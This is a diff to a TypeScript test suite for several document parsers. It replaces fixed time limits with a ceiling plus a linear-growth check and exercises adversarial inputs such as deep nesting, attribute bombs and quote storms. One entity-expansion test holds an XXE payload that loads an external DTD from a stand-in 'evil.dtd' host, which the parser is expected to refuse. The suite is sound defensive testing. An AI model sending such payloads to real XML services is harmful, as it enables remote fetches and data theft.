@@ -1,18 +1,23 @@
 import {testParsers as defaultParsers} from "../testing/parsers.ts";
 import {createTestParserRegistry as createDefaultRegistry} from '../testing/parsers.ts';
 import { kityminderParser, xmlParser, htmlParser } from '../testing/parsers.ts';
-// Adversarial inputs for every core parser: large inputs under a time bound, nesting and entity attacks, invalid
+// Adversarial inputs for every core parser: large inputs that must scale linearly, nesting and entity attacks, invalid
 // UTF-8, NUL and control characters, attribute bombs and random bytes. A parser either succeeds or throws a ParseError.
 import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
 import { describe, it } from 'node:test';
 import {ParseEncodingError,ParseError,ParseForbiddenError,ParseLimitError,ParseSyntaxError,candidatesFrom,createDocumentCache,findQuote,jsonParser,markdownParser,resolveReference,srcFragment,textParser,type Parser} from "./api.ts";
+import { assertLinearGrowth } from '../testing/growth.ts';
 import { fixture, seeded, timed, utf8 } from './test-support.ts';
 
 const MB = 1024 * 1024;
-// Measured locally at about 0.1-2 s for 10 MB; the bound leaves room for slow machines while catching super-linear time.
-const LARGE_BOUND_MS = 10_000;
-const REJECT_BOUND_MS = 5_000;
+// A 10 MB input takes about 0.1-2.5 s locally and up to about 5 s on a CI runner. The ceiling is a catastrophic guard
+// (a hang or an exponential blow-up), about ten times that; super-linear time is caught by the growth check instead,
+// which compares the CPU time of the same input at two sizes and so does not depend on how fast or busy the runner is.
+const CEILING_MS = 60_000;
+// Growth is measured between 128 KB and 1 MB (factor 8): large enough to be well above timer noise, small enough to
+// repeat. Any cost quadratic in the input is already dominant at these sizes.
+const GROWTH_SMALL = 128 * 1024;
 
 function fill(unit: string, bytes: number): string {
   return unit.repeat(Math.ceil(bytes / Buffer.byteLength(unit)));
@@ -25,25 +30,38 @@ function bounded(parser: Parser, input: Uint8Array, bound: number, options = {})
   return outcome;
 }
 
-describe('10 MB inputs parse within the time bound', () => {
+/** Parses the 10 MB input under the catastrophic ceiling, then checks that the cost grows linearly with the size. */
+function scaled(parser: Parser, make: (bytes: number) => Uint8Array, options = {}): ReturnType<typeof timed> {
+  const outcome = bounded(parser, make(10 * MB), CEILING_MS, options);
+  assertLinearGrowth(parser.id, make, (input) => parser.parse(input, options), { small: GROWTH_SMALL });
+  return outcome;
+}
+
+/** Scales a count chosen for a 10 MB input to an input of `bytes` bytes. */
+function per10MB(count: number, bytes: number): number {
+  return Math.max(1, Math.round((count * bytes) / (10 * MB)));
+}
+
+describe('10 MB inputs parse within the ceiling and in linear time', () => {
   it('kityminder@1', () => {
-    const children = Array.from({ length: 40_000 }, (_, i) => ({ data: { id: `c${i}`, text: `用例标题 ${'文字'.repeat(20)} ${i}`, priority: 2, resource: ['smoke'] }, children: [{ data: { id: `e${i}`, text: '期望结果' } }] }));
-    const input = utf8(JSON.stringify({ root: { data: { id: 'r', text: 'root' }, children } }));
-    assert.ok(input.length > 8 * MB);
-    const outcome = bounded(kityminderParser, input, LARGE_BOUND_MS);
+    const map = (bytes: number): Uint8Array => {
+      const children = Array.from({ length: per10MB(40_000, bytes) }, (_, i) => ({ data: { id: `c${i}`, text: `用例标题 ${'文字'.repeat(20)} ${i}`, priority: 2, resource: ['smoke'] }, children: [{ data: { id: `e${i}`, text: '期望结果' } }] }));
+      return utf8(JSON.stringify({ root: { data: { id: 'r', text: 'root' }, children } }));
+    };
+    assert.ok(map(10 * MB).length > 8 * MB);
+    const outcome = scaled(kityminderParser, map);
     assert.equal(outcome.error, null);
   });
 
   it('xml@1', () => {
     const item = '<item name="add" help="Create"><arguments><arg name="pool_name" type="STRING" length="32" optional="0" help="Name of the pool"/></arguments></item>\n';
-    const input = utf8(`<commands><scope name="g"><menu name="m">${fill(item, 10 * MB)}</menu></scope></commands>`);
-    const outcome = bounded(xmlParser, input, LARGE_BOUND_MS);
+    const outcome = scaled(xmlParser, (bytes) => utf8(`<commands><scope name="g"><menu name="m">${fill(item, bytes)}</menu></scope></commands>`));
     assert.equal(outcome.error, null);
   });
 
   it('html@1', () => {
     const entry = '<font color=red>Rel_X_1 (build on  2026-01-01 ): Released on 2026-01-02</font> </br><BLOCKQUOTE><A href=a.array>image</A> ( 42M )<BR></BLOCKQUOTE><hr>\n';
-    const outcome = bounded(htmlParser, utf8(`<html><body>${fill(entry, 10 * MB)}</body></html>`), LARGE_BOUND_MS);
+    const outcome = scaled(htmlParser, (bytes) => utf8(`<html><body>${fill(entry, bytes)}</body></html>`));
     assert.equal(outcome.error, null);
   });
 
@@ -53,15 +71,15 @@ describe('10 MB inputs parse within the time bound', () => {
       '## 小节：会话保持的配置与验证\n\n一段说明文字，描述会话保持的行为、超时与异常处理，用来测试大文件的解析速度。\n\n' +
       '+--------------+------------------------------+\n| 参数         | 说明                         |\n+--------------+------------------------------+\n\n' +
       '- 列表项：按源地址保持会话\n- 列表项：按 Cookie 保持会话\n\n```\n# 代码块里的井号不是标题\n```\n\n';
-    const outcome = bounded(markdownParser, utf8(fill(unit, 10 * MB)), LARGE_BOUND_MS);
+    const outcome = scaled(markdownParser, (bytes) => utf8(fill(unit, bytes)));
     assert.equal(outcome.error, null);
   });
 
   it('json@1 and text@1', () => {
-    const json = utf8(JSON.stringify(Array.from({ length: 220_000 }, (_, i) => ({ id: i, name: `名称${i}`, tags: ['a', 'b'] }))));
-    assert.ok(json.length > 8 * MB);
-    assert.equal(bounded(jsonParser, json, LARGE_BOUND_MS).error, null);
-    assert.equal(bounded(textParser, utf8(fill('a line of text 一行文字\n', 10 * MB)), LARGE_BOUND_MS).error, null);
+    const json = (bytes: number): Uint8Array => utf8(JSON.stringify(Array.from({ length: per10MB(220_000, bytes) }, (_, i) => ({ id: i, name: `名称${i}`, tags: ['a', 'b'] }))));
+    assert.ok(json(10 * MB).length > 8 * MB);
+    assert.equal(scaled(jsonParser, json).error, null);
+    assert.equal(scaled(textParser, (bytes) => utf8(fill('a line of text 一行文字\n', bytes))).error, null);
   });
 
   it('refuses input above the byte limit before decoding it', () => {
@@ -73,50 +91,50 @@ describe('10 MB inputs parse within the time bound', () => {
   });
 });
 
-describe('pathological 10 MB inputs are refused or parsed within the time bound', () => {
-  const cases: Array<[string, Parser, () => Uint8Array, (error: unknown) => boolean]> = [
-    ['deep XML', xmlParser, () => utf8(fill('<a>', 10 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
-    ['deep HTML', htmlParser, () => utf8(fill('<div>', 10 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
-    ['deep nested lists in HTML', htmlParser, () => utf8(fill('<ul><li>', 10 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
-    ['deep JSON', jsonParser, () => utf8('['.repeat(5 * MB) + ']'.repeat(5 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
-    ['deep mind map', kityminderParser, () => utf8(fill('{"root":{"children":[', 9 * MB)), (e) => e instanceof ParseSyntaxError || e instanceof ParseLimitError],
-    ['one HTML tag with a million attributes', htmlParser, () => utf8(`<i ${fill('x ', 10 * MB)}>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
-    ['one XML tag with a million attributes', xmlParser, () => utf8(`<i ${Array.from({ length: 1_200_000 }, (_, i) => `a${i}="1"`).join(' ')}/>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
-    ['an XML quote storm', xmlParser, () => utf8(`<a ${fill('b="x "y" ', 10 * MB)}/>`), (e) => e instanceof ParseError],
-    ['10 MB of <', xmlParser, () => utf8(fill('<', 10 * MB)), (e) => e instanceof ParseSyntaxError],
-    ['a 10 MB JSON string of quotes', kityminderParser, () => utf8(JSON.stringify(fill('"', 5 * MB))), (e) => e instanceof ParseSyntaxError],
-    ['too many lines', textParser, () => utf8(fill('\n', 10 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxNodes'],
-    ['XML attribute values that never close', xmlParser, () => utf8(`<r>${fill('<a b="', 10 * MB)}`), (e) => e instanceof ParseError],
-    ['XML attribute values that never close, single quotes', xmlParser, () => utf8(`<r>${fill("<a b='", 10 * MB)}`), (e) => e instanceof ParseError],
-    ['an attribute bomb inside select', htmlParser, () => utf8(`<select><plaintext><p ${fill('a ', 10 * MB)}>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
-    ['nested templates', htmlParser, () => utf8(fill('<template>', 10 * MB)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
-    ['repeated body tags with new attributes', htmlParser, () => utf8(Array.from({ length: 2_000 }, (_, t) => `<body ${Array.from({ length: 500 }, (_, i) => `b${t}_${i}`).join(' ')}>`).join('')), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
-    ['foster-parented text before a table', htmlParser, () => utf8(`<table>${fill('x<b>y</b>', 10 * MB)}`), (e) => e instanceof ParseLimitError],
-    ['misnested formatting around tables', htmlParser, () => utf8(fill('<a><table><a>', 10 * MB)), (e) => e instanceof ParseLimitError],
-    ['text deep inside formatting elements', htmlParser, () => utf8(`<p>${'<b>'.repeat(250)}${fill('<i>x</i>', 10 * MB)}`), (e) => e instanceof ParseLimitError],
-    ['a long heading over many blocks', markdownParser, () => utf8(`# ${'h'.repeat(20_000)}\n\n${fill('p\n\n', 10 * MB)}`), (e) => e instanceof ParseLimitError],
+describe('pathological 10 MB inputs are refused or parsed within the ceiling and in linear time', () => {
+  const cases: Array<[string, Parser, (bytes: number) => Uint8Array, (error: unknown) => boolean]> = [
+    ['deep XML', xmlParser, (bytes) => utf8(fill('<a>', bytes)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
+    ['deep HTML', htmlParser, (bytes) => utf8(fill('<div>', bytes)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
+    ['deep nested lists in HTML', htmlParser, (bytes) => utf8(fill('<ul><li>', bytes)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
+    ['deep JSON', jsonParser, (bytes) => utf8('['.repeat(bytes / 2) + ']'.repeat(bytes / 2)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
+    ['deep mind map', kityminderParser, (bytes) => utf8(fill('{"root":{"children":[', (bytes * 9) / 10)), (e) => e instanceof ParseSyntaxError || e instanceof ParseLimitError],
+    ['one HTML tag with a million attributes', htmlParser, (bytes) => utf8(`<i ${fill('x ', bytes)}>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
+    ['one XML tag with a million attributes', xmlParser, (bytes) => utf8(`<i ${Array.from({ length: per10MB(1_200_000, bytes) }, (_, i) => `a${i}="1"`).join(' ')}/>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
+    ['an XML quote storm', xmlParser, (bytes) => utf8(`<a ${fill('b="x "y" ', bytes)}/>`), (e) => e instanceof ParseError],
+    ['10 MB of <', xmlParser, (bytes) => utf8(fill('<', bytes)), (e) => e instanceof ParseSyntaxError],
+    ['a 10 MB JSON string of quotes', kityminderParser, (bytes) => utf8(JSON.stringify(fill('"', bytes / 2))), (e) => e instanceof ParseSyntaxError],
+    ['too many lines', textParser, (bytes) => utf8(fill('\n', bytes)), (e) => e instanceof ParseLimitError && e.limit === 'maxNodes'],
+    ['XML attribute values that never close', xmlParser, (bytes) => utf8(`<r>${fill('<a b="', bytes)}`), (e) => e instanceof ParseError],
+    ['XML attribute values that never close, single quotes', xmlParser, (bytes) => utf8(`<r>${fill("<a b='", bytes)}`), (e) => e instanceof ParseError],
+    ['an attribute bomb inside select', htmlParser, (bytes) => utf8(`<select><plaintext><p ${fill('a ', bytes)}>`), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
+    ['nested templates', htmlParser, (bytes) => utf8(fill('<template>', bytes)), (e) => e instanceof ParseLimitError && e.limit === 'maxDepth'],
+    ['repeated body tags with new attributes', htmlParser, (bytes) => utf8(Array.from({ length: per10MB(2_000, bytes) }, (_, t) => `<body ${Array.from({ length: 500 }, (_, i) => `b${t}_${i}`).join(' ')}>`).join('')), (e) => e instanceof ParseLimitError && e.limit === 'maxAttributes'],
+    ['foster-parented text before a table', htmlParser, (bytes) => utf8(`<table>${fill('x<b>y</b>', bytes)}`), (e) => e instanceof ParseLimitError],
+    ['misnested formatting around tables', htmlParser, (bytes) => utf8(fill('<a><table><a>', bytes)), (e) => e instanceof ParseLimitError],
+    ['text deep inside formatting elements', htmlParser, (bytes) => utf8(`<p>${'<b>'.repeat(250)}${fill('<i>x</i>', bytes)}`), (e) => e instanceof ParseLimitError],
+    ['a long heading over many blocks', markdownParser, (bytes) => utf8(`# ${'h'.repeat(20_000)}\n\n${fill('p\n\n', bytes)}`), (e) => e instanceof ParseLimitError],
   ];
   for (const [name, parser, input, expected] of cases) {
     it(`${name} (${parser.id})`, () => {
-      const outcome = bounded(parser, input(), REJECT_BOUND_MS);
+      const outcome = scaled(parser, input);
       assert.ok(expected(outcome.error), `${name}: ${String(outcome.error)}`);
     });
   }
 
-  it('accepts what is merely unusual, within the bound', () => {
-    const accepted: Array<[string, Parser, Uint8Array]> = [
-      ['many tags with 500 attributes each', htmlParser, utf8(`<html><body>${fill(`<i ${Array.from({ length: 500 }, (_, i) => `a${i}`).join(' ')}></i>`, 10 * MB)}`)],
-      ['a 10 MB heading line', markdownParser, utf8(`# ${fill('a # ', 10 * MB)}x`)],
-      ['a 10 MB pipe line', markdownParser, utf8(fill('| a ', 10 * MB))],
-      ['dash rules and text', markdownParser, utf8(fill('---\ntext\n', 3 * MB))],
-      ['an unclosed fence', markdownParser, utf8(`\`\`\`\n${fill('# 代码里的一行，不是标题\n', 10 * MB)}`)],
-      ['a 10 MB single line', textParser, utf8(fill('x', 10 * MB))],
-      ['10 MB of <', htmlParser, utf8(fill('<', 10 * MB))],
-      ['10 MB of nested quotes in a value', htmlParser, utf8(`<a title="${fill("'", 10 * MB)}">x</a>`)],
-      ['10 MB of headings with long runs of spaces', markdownParser, utf8(fill(`# a${' '.repeat(100_000)}b\n`, 10 * MB))],
+  it('accepts what is merely unusual, within the ceiling and in linear time', () => {
+    const accepted: Array<[string, Parser, (bytes: number) => Uint8Array]> = [
+      ['many tags with 500 attributes each', htmlParser, (bytes) => utf8(`<html><body>${fill(`<i ${Array.from({ length: 500 }, (_, i) => `a${i}`).join(' ')}></i>`, bytes)}`)],
+      ['a 10 MB heading line', markdownParser, (bytes) => utf8(`# ${fill('a # ', bytes)}x`)],
+      ['a 10 MB pipe line', markdownParser, (bytes) => utf8(fill('| a ', bytes))],
+      ['dash rules and text', markdownParser, (bytes) => utf8(fill('---\ntext\n', (bytes * 3) / 10))],
+      ['an unclosed fence', markdownParser, (bytes) => utf8(`\`\`\`\n${fill('# 代码里的一行，不是标题\n', bytes)}`)],
+      ['a 10 MB single line', textParser, (bytes) => utf8(fill('x', bytes))],
+      ['10 MB of <', htmlParser, (bytes) => utf8(fill('<', bytes))],
+      ['10 MB of nested quotes in a value', htmlParser, (bytes) => utf8(`<a title="${fill("'", bytes)}">x</a>`)],
+      ['10 MB of headings with long runs of spaces', markdownParser, (bytes) => utf8(fill(`# a${' '.repeat(100_000)}b\n`, bytes))],
     ];
     for (const [name, parser, input] of accepted) {
-      const outcome = bounded(parser, input, LARGE_BOUND_MS);
+      const outcome = scaled(parser, input);
       assert.equal(outcome.error, null, `${name}: ${String(outcome.error)}`);
     }
   });
@@ -132,7 +150,7 @@ describe('entity expansion attempts', () => {
       '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://192.0.2.1/evil.dtd"> %p;]><x/>',
     ];
     for (const xml of attempts) {
-      const outcome = bounded(xmlParser, utf8(xml), REJECT_BOUND_MS);
+      const outcome = bounded(xmlParser, utf8(xml), CEILING_MS);
       assert.ok(outcome.error instanceof ParseForbiddenError, xml.slice(0, 40));
     }
   });
